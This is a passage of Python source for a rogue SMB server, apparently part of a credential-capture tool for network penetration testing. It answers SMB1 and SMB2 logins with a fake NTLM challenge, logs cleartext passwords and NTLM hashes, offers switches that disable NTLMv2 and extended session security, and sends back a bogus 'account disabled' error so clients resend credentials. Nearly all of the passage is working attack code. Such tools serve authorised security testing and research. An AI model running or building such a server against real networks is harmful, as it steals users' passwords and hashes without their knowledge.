        if client_os or client_lanman:
            handler.logger.display(
                f"<SMB_COM_SESSION_SETUP_ANDX> Client OS: {client_os!r} "
                f"LanMan: {client_lanman!r}",
                is_client=True,
            )
    except Exception:
        handler.logger.debug(
            "Failed to extract SMB1 basic session setup client info",
            exc_info=True,
        )

    # Determine transport type — cleartext vs challenge/response
    # [MS-CIFS] §3.2.4.2.4: even when NEGOTIATE_ENCRYPT_PASSWORDS is set,
    # the server "MAY also accept plaintext." Detect cleartext-despite-
    # challenge via non-standard response lengths.
    if not handler.smb1_negotiate_encrypt:
        # Server advertised plaintext mode (ForceSMB1Plaintext=true)
        transport = NTLM_TRANSPORT_CLEARTEXT
    elif oem_len == 0 and uni_len == 0:
        # Anonymous — no credentials at all
        transport = None
    elif handler.smb1_negotiate_encrypt and (
        # Only OEM populated with non-standard length (not 0, not 24)
        (uni_len == 0 and oem_len not in (0, 24) and oem_len <= 256)
        # Only Unicode populated with non-standard length
        or (oem_len == 0 and uni_len not in (0, 24) and uni_len <= 512)
    ):
        # Unexpected plaintext despite challenge — [MS-CIFS] §3.2.4.2.4
        handler.logger.display(
            "<SMB_COM_SESSION_SETUP_ANDX> Plaintext password detected "
            "despite challenge (unusual client behavior)",
            is_client=True,
        )
        transport = NTLM_TRANSPORT_CLEARTEXT
    else:
        transport = NTLM_TRANSPORT_RAW

    # Capture credentials
    if transport == NTLM_TRANSPORT_CLEARTEXT:
        # Cleartext password — extract from whichever field is populated
        if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE and uni_pwd:
            password = uni_pwd.decode("utf-16-le", errors="replace")
        elif oem_pwd:
            password = oem_pwd.decode("ascii", errors="replace")
        else:
            password = ""

        if password and account:
            NTLM_report_raw_fields(
                user_name=account,
                domain_name=domain,
                lm_response=None,
                nt_response=None,
                challenge=handler.smb1_challenge,
                client=handler.client_address,
                session=handler.config,
                logger=handler.logger,
                transport=NTLM_TRANSPORT_CLEARTEXT,
                cleartext_password=password,
            )
    elif transport == NTLM_TRANSPORT_RAW:
        NTLM_report_raw_fields(
            user_name=account,
            domain_name=domain,
            lm_response=oem_pwd,
            nt_response=uni_pwd,
            challenge=handler.smb1_challenge,
            client=handler.client_address,
            session=handler.config,
            logger=handler.logger,
            transport=NTLM_TRANSPORT_RAW,
        )
    # else: anonymous — skip capture

    # G6: allocate Uid for basic-security path — [MS-SMB] §3.3.5.3
    if handler.smb1_uid == 0:
        handler.smb1_uid = secrets.randbelow(0xFFFE) + 1

    # Build response — [MS-CIFS] §2.2.4.53.2 (WordCount=3)
    resp_params = smb.SMBSessionSetupAndXResponse_Parameters()
    resp_data = smb.SMBSessionSetupAndXResponse_Data(flags=packet["Flags2"])
    resp_params["Action"] = 0
    resp_data["NativeOS"] = smbserver.encodeSMBString(packet["Flags2"], cfg.smb_server_os)
    resp_data["NativeLanMan"] = smbserver.encodeSMBString(
        packet["Flags2"], cfg.effective_native_lanman
    )

    # Determine error code — multi-cred or final
    error_code = _resolve_auth_error_code(handler)

    handler.send_smb1_command(
        smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
        resp_data,
        resp_params,
        packet,
        error_code=error_code,
    )


# --- SMB1 Tree Connect -------------------------------------------------------
def smb1_tree_connect(handler: "SMBHandler", packet: smb.NewSMBPacket) -> None:
    """Minimal SMB1 TREE_CONNECT_ANDX handler.

    Spec: [MS-CIFS] §2.2.4.55, [MS-SMB] §3.3.5.4
    """
    try:
        cmd = smb.SMBCommand(packet["Data"][0])
        # [MS-CIFS] §2.2.4.55.1 — parse request data for Path field
        tc_data = smb.SMBTreeConnectAndX_Data(flags=packet["Flags2"])
        tc_data.fromString(cmd["Data"])
        path = (
            tc_data["Path"]
            .decode(
                "utf-16-le" if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE else "ascii",
                errors="replace",
            )
            .rstrip("\x00")
        )
        # G12: tree connect path — verbose per CLIENT_EXTRACTION.md
        handler.logger.display(
            f"<SMB_COM_TREE_CONNECT_ANDX> Tree connect: {path}",
            is_client=True,
        )
    except Exception:
        handler.log_client("Tree connect (malformed)", "SMB_COM_TREE_CONNECT_ANDX")

    resp_params = smb.SMBTreeConnectAndXResponse_Parameters()
    resp_params["OptionalSupport"] = 0x0001  # SMB_SUPPORT_SEARCH_BITS
    resp_data = smb.SMBTreeConnectAndXResponse_Data(flags=packet["Flags2"])
    resp_data["Service"] = b"IPC\x00"
    resp_data["NativeFileSystem"] = smbserver.encodeSMBString(packet["Flags2"], "")

    handler.send_smb1_command(
        smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
        resp_data,
        resp_params,
        packet,
    )


# --- Multi-Credential Helpers ------------------------------------------------
def _resolve_auth_error_code(handler: "SMBHandler") -> int:
    """Determine the NTSTATUS error code for the current auth attempt.

    Implements the multi-credential capture loop (G1): if more captures
    remain, return STATUS_ACCOUNT_DISABLED to trigger SSPI retry.
    Otherwise return the configured final error code.
    """
    handler.auth_attempt_count += 1
    max_captures = handler.smb_config.smb_captures_per_connection

    if handler.auth_attempt_count < max_captures:
        return STATUS_ACCOUNT_DISABLED
    return handler.smb_config.smb_error_code


# --- Handler ---
class SMBHandler(BaseProtoHandler):
    STATE_NEGOTIATE = 0
    STATE_AUTH = 1

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        request: typing.Any,
        client_address: tuple[str, int],
        server: typing.Any,
    ) -> None:
        self.authenticated = False
        self.smb_config = server_config

        # Per-connection state
        self.smb1_extended_security: bool = True
        self.smb1_challenge: bytes = server_config.ntlm_challenge
        self.smb1_negotiate_encrypt: bool = True
        self.smb1_uid: int = 0  # G6: allocated on first session setup
        self.smb2_session_id: int = 0  # G5: allocated on first session setup
        self.auth_attempt_count: int = 0  # G1: multi-credential counter

        self.smb1_commands: dict[int, typing.Any] = {
            smb.SMB.SMB_COM_NEGOTIATE: smb1_negotiate_protocol,
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX: smb1_session_setup,
            0x75: smb1_tree_connect,  # SMB_COM_TREE_CONNECT_ANDX
        }
        self.smb2_commands: dict[int, typing.Any] = {
            smb2.SMB2_NEGOTIATE: smb2_negotiate_protocol,
            smb2.SMB2_SESSION_SETUP: smb2_session_setup,
            smb2.SMB2_LOGOFF: smb2_logoff,
            smb2.SMB2_TREE_CONNECT: smb2_tree_connect,
        }
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "SMB",
                "protocol_color": "light_goldenrod1",
                "host": self.client_host,
                "port": self.smb_config.smb_port,
            }
        )

    def send_data(self, payload: bytes, ty: int | None = None) -> None:
        packet = nmb.NetBIOSSessionPacket()
        packet.set_type(ty or nmb.NETBIOS_SESSION_MESSAGE)
        packet.set_trailer(payload)
        self.send(packet.rawData())

    def send_smb1_command(
        self,
        command: int,
        data: object,
        parameters: object,
        packet: smb.NewSMBPacket,
        error_code: int | None = None,
    ) -> None:
        """Build and send an SMB1 response.

        G3: Flags2 is derived from the connection's security mode —
        FLAGS2_EXTENDED_SECURITY is only set when smb1_extended_security
        is True.
        G6: Uid is set from smb1_uid when allocated.
        """
        resp = smb.NewSMBPacket()
        # [MS-CIFS] §2.2.3.1: SMB_FLAGS_REPLY (0x80) on server responses
        resp["Flags1"] = smb.SMB.FLAGS1_REPLY

        # G3: mode-aware Flags2 — [MS-SMB] §2.2.3.1
        flags2 = (
            smb.SMB.FLAGS2_NT_STATUS
            | smb.SMB.FLAGS2_LONG_NAMES
            | (packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
        )
        if self.smb1_extended_security:
            flags2 |= smb.SMB.FLAGS2_EXTENDED_SECURITY
        resp["Flags2"] = flags2

        resp["Pid"] = packet["Pid"]
        resp["Tid"] = packet["Tid"]
        resp["Mid"] = packet["Mid"]
        # G6: set Uid — [MS-SMB] §3.3.5.3
        if self.smb1_uid:
            resp["Uid"] = self.smb1_uid
        if error_code:
            resp["ErrorCode"] = error_code >> 16
            resp["_reserved"] = error_code >> 8 & 0xFF
            resp["ErrorClass"] = error_code & 0xFF

        cmd = smb.SMBCommand(command)
        cmd["Data"] = data
        cmd["Parameters"] = parameters
        resp.addCommand(cmd)

        self.send_data(resp.getData())

    def send_smb2_command(
        self,
        command_data: bytes,
        packet: typing.Any | None = None,
        command: int | None = None,
        status: int | None = None,
    ) -> None:
        """Build and send an SMB2 response.

        G5: SessionID is set from smb2_session_id when allocated.
        """
        resp = smb2.SMB2Packet()
        # [MS-SMB2] §2.2.1: SMB2_FLAGS_SERVER_TO_REDIR (0x01) on responses
        resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
        # [MS-SMB2] §2.2.1: NTSTATUS code
        resp["Status"] = status or nt_errors.STATUS_SUCCESS

        if packet is None:
            packet = {
                "Command": command or 0,
                "CreditCharge": 0,
                "Reserved": 0,
                "MessageID": 0,
                # [MS-SMB2] §2.2.1: TreeId MUST be 0 for NEGOTIATE
                "TreeID": 0,
            }
        resp["Command"] = packet["Command"]
        resp["CreditCharge"] = packet["CreditCharge"]
        resp["Reserved"] = packet["Reserved"]
        # G5: proper SessionID — [MS-SMB2] §3.3.5.5.1
        resp["SessionID"] = self.smb2_session_id
        resp["MessageID"] = packet["MessageID"]
        resp["TreeID"] = packet["TreeID"]
        resp["CreditRequestResponse"] = 1
        resp["Data"] = command_data
        self.send_data(resp.getData())

    def setup(self) -> None:
        self.logger.debug(f"Incoming connection from {self.client_host}")

    def finish(self) -> None:
        self.logger.debug(f"Connection to {self.client_host} closed")

    def handle_data(self, data: bytes | None, transport: typing.Any) -> None:
        while True:
            data = self.recv(8192)
            if not data:
                break

            packet = nmb.NetBIOSSessionPacket(data)
            if packet.get_type() == nmb.NETBIOS_SESSION_KEEP_ALIVE:
                self.logger.debug("<NETBIOS_SESSION_KEEP_ALIVE>", is_client=True)
                continue

            if packet.get_type() == nmb.NETBIOS_SESSION_REQUEST:
                try:
                    _, remote, caller = packet.get_trailer().split(b" ")
                    field = NetBIOSNameField("caller", b"<invalid>")
                    called_name = field.m2i(None, b"\x20" + remote[:-2]).decode(
                        errors="replace"
                    )
                    calling_name = field.m2i(None, b"\x20" + caller[:-2]).decode(
                        errors="replace"
                    )
                    # G12: CallingName is verbose per CLIENT_EXTRACTION.md
                    self.logger.display(
                        f"<NETBIOS_SESSION_REQUEST> {calling_name} -> {called_name}",
                        is_client=True,
                    )
                except ValueError:
                    pass
                self.send_data(b"\x00", nmb.NETBIOS_SESSION_POSITIVE_RESPONSE)
                continue

            raw_smb_data = packet.get_trailer()
            if len(raw_smb_data) == 0:
                self.logger.debug("Received empty SMB packet")
                continue

            cfg = self.smb_config
            smbv1 = False
            match raw_smb_data[0]:
                case 0xFF:  # SMB1
                    if not cfg.smb_enable_smb1:
                        self.logger.debug("SMB1 disabled, dropping")
                        break
                    packet = smb.NewSMBPacket(data=raw_smb_data)
                    smbv1 = True
                case 0xFE:  # SMB2/SMB3
                    if not cfg.smb_enable_smb2:
                        self.logger.debug("SMB2 disabled, dropping")
                        break
                    packet = smb2.SMB2Packet(data=raw_smb_data)
                case _:
                    self.logger.debug(f"Unknown SMB packet type: {raw_smb_data[0]}")
                    break

            self.handle_smb_packet(packet, smbv1)

    def handle_smb_packet(self, packet: typing.Any, smbv1: bool = False) -> None:
        command = packet["Command"]
        command_name = SMB_get_command_name(command, 1 if smbv1 else 2)
        title = f"SMBv{1 if smbv1 else 2} command {command_name} ({command:#04x})"
        handler_map = self.smb1_commands if smbv1 else self.smb2_commands
        handler = handler_map.get(command)
        if handler:
            try:
                handler(self, packet)
            except BaseProtoHandler.TerminateConnection:
                raise
            except Exception:
                self.logger.exception(f"Error in {title}")
        else:
            self.logger.fail(f"{title} not implemented")
            raise BaseProtoHandler.TerminateConnection

    def log_client(self, msg: str, command: str | None = None) -> None:
        self.log(msg, command, is_client=True)

    def log_server(self, msg: str, command: str | None = None) -> None:
        self.log(msg, command, is_server=True)

    def log(
        self,
        msg: str,
        command: str | None = None,
        is_server: bool = False,
        is_client: bool = False,
    ) -> None:
        if command:
            msg = f"<{command}> {msg}"
        self.logger.debug(msg, is_server=is_server, is_client=is_client)

    def authenticate(
        self,
        token: bytes,
        command_name: str = "SMB2_SESSION_SETUP",
    ) -> tuple[bytes, int]:
        """Perform NTLMSSP authentication exchange.

        G8: command_name is parameterized for correct log attribution.
        G1: multi-credential capture via _resolve_auth_error_code().
        G5/G6: session IDs allocated on first session setup.
        """
        is_gssapi = not token.startswith(b"NTLMSSP")

        # G5/G6: allocate session IDs on first session setup
        if self.smb2_session_id == 0:
            # [MS-SMB2] §3.3.5.5.1: MUST NOT be 0 or -1
            self.smb2_session_id = secrets.randbelow(0xFFFFFFFFFFFFFFFE) + 1
        if self.smb1_uid == 0:
            # [MS-SMB] §3.3.5.3: unique UID, 1..0xFFFF
            self.smb1_uid = secrets.randbelow(0xFFFE) + 1

        match token[0]:
            case 0x60:  # [RFC4178] §4.2.1 / [MS-SPNG]: ASN.1 APPLICATION[0]
                self.log_client("GSSAPI negTokenInit", command_name)
                try:
                    neg_token = spnego.SPNEGO_NegTokenInit(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None

                mech_type = neg_token["MechTypes"][0]
                if mech_type != TypesMech[SPNEGO_NTLMSSP_MECH]:
                    name = MechTypes.get(mech_type, "<unknown>")
                    self.logger.fail(
                        f"<{command_name}> Unsupported mechanism: "
                        f"{name} ({mech_type.hex()})"
                    )
                    resp = negTokenInit_step(
                        0x02,
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                    return (
                        resp.getData(),
                        nt_errors.STATUS_MORE_PROCESSING_REQUIRED,
                    )
                token = neg_token["MechToken"]

            case 0xA1:  # [RFC4178] §4.2.2 / [MS-SPNG]: ASN.1 CONTEXT[1]
                self.log_client("GSSAPI negTokenArg", command_name)
                try:
                    neg_token = spnego.SPNEGO_NegTokenResp(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None
                token = neg_token["ResponseToken"]

        if len(token) <= 8:
            self.logger.fail(f"<{command_name}> Invalid NTLM token length: {len(token)}")
            raise BaseProtoHandler.TerminateConnection

        cfg = self.smb_config
        error_code = cfg.smb_error_code

        match token[8]:
            case 0x01:  # [MS-NLMP] §2.2.1.1: NEGOTIATE_MESSAGE
                negotiate = ntlm.NTLMAuthNegotiate()
                negotiate.fromString(token)
                if not is_gssapi:
                    self.log_client("NTLMSSP_NEGOTIATE_MESSAGE", command_name)

                # G12: extract client info from NEGOTIATE_MESSAGE
                try:
                    client_info = NTLM_AUTH_format_host(negotiate)
                    self.logger.display(
                        f"<{command_name}> NTLMSSP client: {client_info}",
                        is_client=True,
                    )
                    client_flags: int = negotiate["flags"]
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP NegotiateFlags: 0x{client_flags:08x}",
                        is_client=True,
                    )
                except Exception:
                    self.logger.debug(
                        "Failed to extract NTLMSSP negotiate client info",
                        exc_info=True,
                    )

                # Resolve NTLM identity: NTLM overrides → SMB defaults
                nb_computer = cfg.ntlm_nb_computer or cfg.smb_nb_computer
                nb_domain = cfg.ntlm_nb_domain or cfg.smb_nb_domain
                dns_domain = cfg.ntlm_dns_domain or cfg.smb_nb_domain
                dns_computer = cfg.ntlm_dns_computer or (
                    f"{nb_computer}.{dns_domain}"
                    if dns_domain not in ("", "WORKGROUP")
                    else nb_computer
                )
                dns_tree = cfg.ntlm_dns_tree

                challenge = NTLM_AUTH_CreateChallenge(
                    negotiate,
                    nb_computer,
                    dns_domain,
                    challenge=cfg.ntlm_challenge,
                    disable_ess=cfg.ntlm_disable_ess,
                    disable_ntlmv2=cfg.ntlm_disable_ntlmv2,
                    target_type=cfg.ntlm_target_type,
                    version=cfg.ntlm_version,
                    nb_computer=nb_computer,
                    nb_domain=nb_domain,
                    dns_computer=dns_computer,
                    dns_domain=dns_domain,
                    dns_tree=dns_tree,
                )
                self.log_server("NTLMSSP_CHALLENGE_MESSAGE", command_name)
                if is_gssapi:
                    resp = negTokenInit_step(
                        0x01,
                        challenge.getData(),
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                else:
                    resp = challenge

                # [MS-SMB2] §3.3.5.5.3: auth still in progress
                error_code = nt_errors.STATUS_MORE_PROCESSING_REQUIRED

            case 0x02:  # [MS-NLMP] §2.2.1.2: CHALLENGE_MESSAGE — unexpected
                if not is_gssapi:
                    self.log_client("NTLMSSP_CHALLENGE_MESSAGE", command_name)
                self.logger.debug("NTLM challenge message not supported!")
                raise BaseProtoHandler.TerminateConnection

            case 0x03:  # [MS-NLMP] §2.2.1.3: AUTHENTICATE_MESSAGE
                authenticate = ntlm.NTLMAuthChallengeResponse()
                authenticate.fromString(token)
                if not is_gssapi:
                    self.log_client("NTLMSSP_AUTHENTICATE_MESSAGE", command_name)

                # G12: log final negotiated flags (debug)
                try:
                    auth_flags: int = authenticate["flags"]
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP final flags: 0x{auth_flags:08x}",
                        is_client=True,
                    )
                except Exception:
                    self.logger.debug(
                        "Failed to extract NTLMSSP auth flags",
                        exc_info=True,
                    )

                NTLM_report_auth(
                    authenticate,
                    challenge=cfg.ntlm_challenge,
                    client=self.client_address,
                    session=self.config,
                    logger=self.logger,
                )

                # G1: multi-credential capture
                error_code = _resolve_auth_error_code(self)
                resp = negTokenInit_step(0x02)

            case message_type:
                self.log_client(f"NTLMSSP: unknown {message_type:02x}", command_name)
                raise BaseProtoHandler.TerminateConnection

        return resp.getData(), error_code


class SMBServer(ThreadingTCPServer):
    default_handler_class = SMBHandler
    default_port = 445

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        server_address: tuple[str, int] | None = None,
        RequestHandlerClass: type | None = None,
    ) -> None:
        self.server_config = server_config
        # G7: stable ServerGuid per server instance — [MS-SMB2] §2.2.4
        self.server_guid: bytes = secrets.token_bytes(16)
        super().__init__(config, server_address, RequestHandlerClass)

    def finish_request(
        self, request: typing.Any, client_address: tuple[str, int]
    ) -> None:
        typing.cast("type", self.RequestHandlerClass)(
            self.config, self.server_config, request, client_address, self
        )
